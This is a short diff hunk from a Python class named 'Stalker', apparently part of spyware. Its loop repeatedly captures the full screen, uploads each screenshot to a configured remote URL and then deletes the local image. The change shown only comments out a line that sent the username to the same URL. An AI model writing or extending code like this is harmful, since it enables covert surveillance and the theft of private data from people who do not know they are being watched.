@@ -108,7 +108,7 @@ class Stalker:
         while self.running:
             time.sleep(self.ScreenshotsDelay_sec)
             ImageGrab.grab().save(self.ScreenshotsImage_name)
-            self.SendText(self.Username, self.Screenshots_url)
+            # self.SendText(self.Username, self.Screenshots_url)
             self.SendImage(self.ScreenshotsImage_name, self.Screenshots_url)
             self.RemoveScreenshots()
     
